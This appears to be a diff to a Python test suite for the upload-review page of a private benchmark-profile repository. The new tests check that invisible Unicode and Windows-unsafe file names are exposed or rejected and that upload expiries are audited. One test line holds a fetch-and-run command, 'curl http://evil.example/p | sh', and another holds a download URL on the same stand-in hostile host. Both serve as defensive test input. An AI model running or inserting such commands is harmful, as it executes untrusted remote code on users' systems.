@@ -19,7 +19,7 @@ import urllib.parse
 import urllib.request
 import uuid
 
-from test_private_repo_http import AID, BASE, REPO_DIR, SRV, call, make_zip, new_machine, sql, srv_sh, test_zip, uniq, upload, TEST_XML, SUITE_XML
+from test_private_repo_http import AID, BASE, REPO_DIR, SRV, call, make_zip, new_machine, sql, srv_sh, suite_zip, test_zip, uniq, upload, TEST_XML, SUITE_XML
 from test_private_repo_tokens import sql_exec
 from test_private_repo_web import ACTION, PAGE, Browser, WebBase, audit, stored, USER, PASS
 
@@ -487,6 +487,10 @@ class TestLimitsExpiryAndIntegrity(UploadBase):
 class TestReviewShowsWhatClientsRun(UploadBase):
     """Phase 3 round 2: the review must not be able to look complete while hiding what a client would execute."""
 
+    def cancel(self, sid):
+        self.admin.post(ACTION, {'action': 'cancel', 'stage_id': sid, 'token_submit': self.admin.token()})
+        self.assertEqual(staged_dirs(), [])
+
     def review(self, z, **kw):
         sid = stage_id(stage(self.admin, z, **kw)[1])
         self.assertTrue(sid, 'the upload should have been staged: ' + flash_of(self.admin, UPLOAD))
@@ -512,6 +516,45 @@ class TestReviewShowsWhatClientsRun(UploadBase):
         sid2, page2 = self.review(script_zip(script))
         self.assertIn('&lt;0xFF&gt;', page2)
         self.assertIn('&lt;0xFE&gt;', page2)
+
+    def test_blank_looking_and_filler_characters_are_made_visible(self):
+        # F3: spaces and fillers that render as nothing, variation selectors and tag characters (a 4-byte code point)
+        cps = [0xA0, 0x2000, 0x2003, 0x200A, 0x202F, 0x205F, 0x3000, 0x2800, 0x3164, 0x115F, 0x1160, 0xFFA0, 0x17B4, 0x17B5, 0xFE00, 0xFE0F, 0xE0000, 0xE0041, 0xE007F]
+        script = '#!/bin/sh\necho a' + ''.join(chr(c) + 'x' for c in cps) + '\nplain \u00e9 \u4e2d ok\n'
+        sid, page = self.review(script_zip(script.encode()))
+        for c in cps:
+            self.assertIn('&lt;U+%04X&gt;' % c, page, hex(c))
+            self.assertNotIn(chr(c), page, hex(c))
+        self.assertIn('plain \u00e9 \u4e2d ok', page, 'ordinary non-ASCII text is left alone')
+        self.cancel(sid)
+
+    def test_every_review_field_taken_from_the_package_shows_invisible_characters(self):
+        # F7/F8: title, description, warnings, the diff lists, "other text files" summaries and the archive's own name
+        name = uniq('vis')
+        xml = TEST_XML % {'title': 'T\u202eitle\u3164x', 'version': '1.0.0'}
+        xml = xml.replace('<Description>d</Description>', '<Description>De\u200bs\u00a0c</Description>')
+        old = test_zip(xml=xml, extra=[('keep.txt', 'same'), ('gone\u202e.txt', 'old'), ('chg\u200b.txt', 'one')])
+        self.assertIn('upload', upload(self.msi, 'test', name, old))
+        new = test_zip(xml=xml, extra=[('keep.txt', 'same'), ('add\u3164ed.txt', 'new'), ('chg\u200b.txt', 'two')])
+        sid, page = self.review(new, filename='a\u202eb\u00e9.zip', name=name)
+        self.assertIn('<tr><th>Title</th><td>T&lt;U+202E&gt;itle&lt;U+3164&gt;x</td></tr>', page)
+        self.assertIn('<tr><th>Description</th><td>De&lt;U+200B&gt;s&lt;U+00A0&gt;c</td></tr>', page)
+        self.assertIn('from <code>a&lt;U+202E&gt;b\u00e9.zip</code>', page)
+        self.assertRegex(page, r'Files added:</strong> <code>add&lt;U\+3164&gt;ed\.txt</code>')
+        self.assertRegex(page, r'Files removed:</strong> <code>gone&lt;U\+202E&gt;\.txt</code>')
+        self.assertRegex(page, r'Files changed:</strong> <code>chg&lt;U\+200B&gt;\.txt</code>')
+        self.assertRegex(page, r'<summary>add&lt;U\+3164&gt;ed\.txt ')
+        for raw in ('\u202e', '\u3164', '\u200b', '\u00a0'):
+            self.assertNotIn(raw, page)
+        self.cancel(sid)
+        # warnings: a suite that references a test nobody can fetch
+        sid, page = self.review(suite_zip(tests=('local/qc\u200bx\u3164',)), name=uniq('vsu'))
+        warn = re.search(r'<strong>Warnings:</strong><br />(.*?)</p>', page, re.S)
+        self.assertTrue(warn, 'the suite should carry a warning')
+        self.assertIn('&lt;U+', warn.group(1))
+        self.assertNotIn('\u200b', page)
+        self.assertNotIn('\u3164', page)
+        self.cancel(sid)
 
     def test_long_lines_wrap_instead_of_hiding_off_screen(self):
         line = 'echo ' + 'x' * 20000 + ' && curl http://evil.example/p | sh'
@@ -621,37 +664,73 @@ class TestReviewShowsWhatClientsRun(UploadBase):
               '<FileName>a\u202eb.bin</FileName></Package></Downloads></PhoronixTestSuite>')
         names = ['x\u202egnp.sh', 'a\u200bb.sh', 'tab\there.txt']
         sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('downloads.xml', dl)] + [(n, b'#!/bin/sh\necho x\n') for n in names]))
-        for raw in ('\u202e', '\u200b', '\t'):
-            self.assertNotIn(raw, page.replace('\t', ''), 'raw %r reached the page' % raw)
         files_table = page.split('<h3>Files</h3>')[1].split('</table>')[0]
+        headings = ''.join(re.findall(r'<h4>.*?</h4>', page))
+        dl_table = page.split('Downloads fetched at install time')[1].split('<h3>Files</h3>')[0]
+        for raw in ('\u202e', '\u200b', '\t'):
+            for where, text in (('files table', files_table), ('script headings', headings), ('downloads table', dl_table)):
+                self.assertNotIn(raw, text, 'raw %r reached the %s' % (raw, where))
+        self.assertNotIn('\u202e', page)
+        self.assertNotIn('\u200b', page)
         self.assertIn('x&lt;U+202E&gt;gnp.sh', files_table)
         self.assertIn('a&lt;U+200B&gt;b.sh', files_table)
         self.assertIn('tab&lt;U+0009&gt;here.txt', files_table)
-        headings = ''.join(re.findall(r'<h4>.*?</h4>', page))
         self.assertIn('x&lt;U+202E&gt;gnp.sh', headings)
-        dl_table = page.split('Downloads fetched at install time')[1].split('<h3>Files</h3>')[0]
         self.assertIn('http://good.example/&lt;U+202E&gt;g&lt;U+200B&gt;np.bin', dl_table)
         self.assertIn('a&lt;U+202E&gt;b.bin', dl_table)
 
-    def test_windows_unsafe_entry_names_are_rejected_at_stage_time(self):
-        # F2: what Windows would extract differently from what the review shows, or cannot extract at all
-        dl = '<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://evil.example/a.bin</URL><FileName>a.bin</FileName></Package></Downloads></PhoronixTestSuite>'
-        bad = ['downloads.xml.', 'downloads.xml ', 'install.sh.', 'DOWNLO~1.XML', 'CON', 'nul.sh', 'com1.txt', 'LPT9', 'sub/aux', 'sub /x.sh', 'downloads.xml:evil', 'a:b']
+    def reject_names(self, cases):
+        """cases: (extra entries, text the rejection must contain). Each must be refused, name which rule fired, and leave nothing staged."""
         before = len(audit(Action='upload_rejected'))
-        for name in bad:
-            with self.subTest(name):
-                z = script_zip(b'#!/bin/sh\necho ok\n', extra=[(name, dl)])
+        for entries, rule in cases:
+            with self.subTest(entries[0][0]):
+                z = script_zip(b'#!/bin/sh\necho ok\n', extra=entries)
                 status, headers, _ = stage(self.admin, z)
-                self.assertIsNone(stage_id(headers), name)
-                self.assertIn('Windows', flash_of(self.admin, UPLOAD), name)
-        z = script_zip(b'#!/bin/sh\necho ok\n', extra=[('Notes.txt', b'a'), ('notes.txt', b'b')])
-        self.assertIsNone(stage_id(stage(self.admin, z)[1]))
-        self.assertIn('only by case', flash_of(self.admin, UPLOAD))
+                self.assertIsNone(stage_id(headers), entries[0][0])
+                flash = flash_of(self.admin, UPLOAD)
+                self.assertIn('Windows', flash)
+                self.assertIn(rule, flash, entries[0][0])
         self.assertEqual(staged_dirs(), [])
-        self.assertEqual(len(audit(Action='upload_rejected')), before + len(bad) + 1)
-        # names that merely look similar are fine
-        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=[('console.sh', b'#!/bin/sh\n'), ('conf/nulled.txt', b'x'), ('a.b.c', b'x'), ('v1~x.txt', b'x')]))
-        self.assertIn('console.sh', page)
+        self.assertEqual(len(audit(Action='upload_rejected')), before + len(cases))
+
+    def test_windows_unsafe_entry_names_are_rejected_at_stage_time(self):
+        # F2: what Windows would extract differently from what the review shows, or cannot extract at all. Each case must trip ITS rule.
+        dl = '<?xml version="1.0"?><PhoronixTestSuite><Downloads><Package><URL>http://evil.example/a.bin</URL><FileName>a.bin</FileName></Package></Downloads></PhoronixTestSuite>'
+        dot, colon, short, device = 'ends in a dot or space', 'contains a colon', 'Windows short (8.3) name', 'is a Windows device name'
+        cases = [('downloads.xml.', dot), ('downloads.xml ', dot), ('install.sh.', dot), ('sub /x.sh', dot),
+                 ('DOWNLO~1.XML', short), ('CON', device), ('nul.sh', device), ('com1.txt', device), ('LPT9', device), ('sub/aux', device),
+                 ('downloads.xml:evil', colon), ('a:b', colon)]
+        self.reject_names([([(n, dl)], rule) for n, rule in cases])
+
+    def test_windows_invalid_characters_are_rejected_at_stage_time(self):
+        # F5: < > " | ? * and control characters 1-31 cannot be in a Windows file name
+        allowed = 'does not allow'
+        self.reject_names([([('a' + c + 'b.txt', b'x')], allowed) for c in ['<', '>', '"', '|', '?', '*', '\x01', '\x09', '\x1f']] +
+                          [([('ok/a' + c + 'b.txt', b'x')], allowed) for c in ['?', '\x0a']])
+
+    def test_names_that_differ_only_by_case_or_file_versus_folder_are_rejected(self):
+        # F4: two entries that collide once extracted on a case-insensitive file system, including a file against a folder
+        self.reject_names([
+            ([('Notes.txt', b'a'), ('notes.txt', b'b')], 'only by case'),
+            ([('Foo', b'#!/bin/sh\n'), ('foo/x.sh', b'#!/bin/sh\n')], 'is a folder'),
+            ([('foo/x.sh', b'#!/bin/sh\n'), ('Foo', b'#!/bin/sh\n')], 'is a file here'),
+            ([('Dir/', b''), ('dir', b'x')], 'is a file here'),
+            ([('a/b/c.sh', b'#!/bin/sh\n'), ('A/B', b'x')], 'is a file here')])
+
+    def test_long_non_ascii_names_are_cut_on_a_character_boundary(self):
+        # F6: a byte cut would show the tail of the name as <0xNN>
+        self.reject_names([([('\u00e9' * 100 + 'x.', b'x')], dot) for dot in ['ends in a dot or space']])
+        self.assertNotIn('&lt;0x', flash_of(self.admin, UPLOAD))
+        self.assertIn('\u00e9' * 80, flash_of(self.admin, UPLOAD))
+
+    def test_names_that_merely_look_similar_are_not_rejected(self):
+        # install_windows.sh, .htaccess, a~b, console.sh ... are all fine; the stage is cancelled so nothing is left behind
+        extra = [('console.sh', b'#!/bin/sh\n'), ('conf/nulled.txt', b'x'), ('a.b.c', b'x'), ('v1~x.txt', b'x'), ('install_windows.sh', b'#!/bin/sh\n'),
+                 ('.htaccess', b'x'), ('a~b', b'x'), ('x.d/y', b'x'), ('Sub/one.txt', b'x'), ('sub/two.txt', b'x'), ('d/', b''), ('d/f', b'x')]
+        sid, page = self.review(script_zip(b'#!/bin/sh\necho ok\n', extra=extra))
+        for n in ('console.sh', 'install_windows.sh', '.htaccess', 'a~b', 'x.d/y'):
+            self.assertIn(n, page)
+        self.cancel(sid)
 
     def test_downloads_table_reads_the_file_the_way_the_client_does(self):
         # F3: the client ignores the root element's name and uses the first Downloads child
@@ -854,6 +933,48 @@ class TestFailClosed(UploadBase):
         sql_exec('DROP TRIGGER qc_up_block_upload_expired')
         b.get(PAGE)
         self.assertNotIn(sid, staged_dirs())
+        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
+
+    MIRROR = '/var/log/phoromatic-private-repo-audit.log'
+
+    def break_mirror(self):
+        # a directory where the mirror log should be: the audit row still goes into the database, the mirror line cannot be written
+        srv_sh('mv %s %s.qcbak 2>/dev/null; mkdir %s' % ((self.MIRROR,) * 3))
+        self.addCleanup(self.fix_mirror)
+
+    def fix_mirror(self):
+        srv_sh('rmdir %s 2>/dev/null; if [ -f %s.qcbak ]; then mv %s.qcbak %s; fi' % ((self.MIRROR,) * 4))
+
+    def test_a_retried_expiry_does_not_add_a_second_audit_row(self):
+        # when the row was stored but the mirror line failed, the stage is kept and the retry must reuse that row
+        b = self.admin
+        name = uniq('fcd')
+        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
+        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json" % (STAGING, sid))
+        self.break_mirror()
+        for _ in range(3):
+            b.get(PAGE)
+        self.assertIn(sid, staged_dirs(), 'row but no mirror line: not audited, so not removed')
+        self.assertEqual(sorted(srv_sh('ls %s%s' % (STAGING, sid)).split()), ['meta.json', 'upload.zip'])
+        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1, 'one row, however often it was retried')
+        self.fix_mirror()
+        b.get(PAGE)
+        self.assertNotIn(sid, staged_dirs())
+        self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
+
+    def test_a_claim_whose_owner_died_is_audited_before_it_is_removed(self):
+        b = self.admin
+        name = uniq('fcx')
+        sid = stage_id(stage(b, test_zip(), filename=name + '.zip')[1])
+        srv_sh("sed -i 's/\"expires\":[0-9]*/\"expires\":1000/' %s%s/meta.json && mv %s%s/upload.zip %s%s/expiring.zip" % ((STAGING, sid) * 3))
+        srv_sh('touch -d "2 days ago" %s%s' % (STAGING, sid))
+        self.block('upload_expired')
+        b.get(PAGE)
+        self.assertEqual(staged_dirs(), [sid], 'no audit row, no removal, even for a dead claim')
+        self.assertEqual(audit(Name=name, Action='upload_expired'), [])
+        sql_exec('DROP TRIGGER qc_up_block_upload_expired')
+        b.get(PAGE)
+        self.assertEqual(staged_dirs(), [])
         self.assertEqual(len(audit(Name=name, Action='upload_expired')), 1)
 
     def test_cancel_needs_its_audit_row(self):
